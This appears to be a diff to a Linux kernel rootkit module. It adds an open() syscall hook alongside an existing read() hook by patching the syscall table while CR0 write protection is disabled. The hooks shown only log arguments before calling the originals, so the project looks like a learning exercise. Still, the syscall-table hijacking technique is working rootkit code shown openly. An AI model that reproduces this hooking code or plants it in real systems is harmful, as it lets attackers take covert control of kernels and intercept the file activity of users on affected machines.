@@ -17,6 +17,7 @@ static unsigned long orig_cr0;
 static kallsyms_t lookup_name;
 static uint64_t *syscall_table;
 static sysfun_t orig_read;
+static sysfun_t orig_open;
 
 static int __init rootkit_init(void)
 {
@@ -44,6 +45,8 @@ static int __init rootkit_init(void)
 
     orig_read = (sysfun_t) syscall_table[__NR_read];
     syscall_table[__NR_read] = (uint64_t) new_read;
+    orig_open = (sysfun_t) syscall_table[__NR_open];
+    syscall_table[__NR_open] = (uint64_t) new_open;
 
     protect_memory(orig_cr0);
 
@@ -58,6 +61,7 @@ static __exit void rootkit_exit(void)
     orig_cr0 = unprotect_memory();
 
     syscall_table[__NR_read] = (uint64_t) orig_read;
+    syscall_table[__NR_open] = (uint64_t) orig_open;
 
     protect_memory(orig_cr0);
 
@@ -65,15 +69,26 @@ static __exit void rootkit_exit(void)
     return;
 }
 
-int new_read(struct pt_regs *regs)
+long new_read(struct pt_regs *regs)
 {
-    int fd = (int) regs->di; // first parameter
-    void *buf = (void*)regs->si; // second parameter
-    size_t count = (size_t)regs->dx; // third parameter
+    unsigned int fd = (unsigned int) regs->di; // first parameter
+    char *buf = (char *) regs->si; // second parameter
+    size_t count = (size_t) regs->dx; // third parameter
 
-    pr_info("[ROOTKIT] open(%d, %p, %zd)", fd, buf, count);
+    pr_info("[ROOTKIT] read(%u, %p, %zd)", fd, buf, count);
 
     return orig_read(regs);
+}
+
+long new_open(struct pt_regs *regs)
+{
+    const char *filename = (const char *) regs->di;
+    int flags = (int) regs->si;
+    umode_t mode = (umode_t) regs->dx;
+
+    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", filename, flags, mode);
+
+    return orig_open(regs);
 }
 
 module_init(rootkit_init);
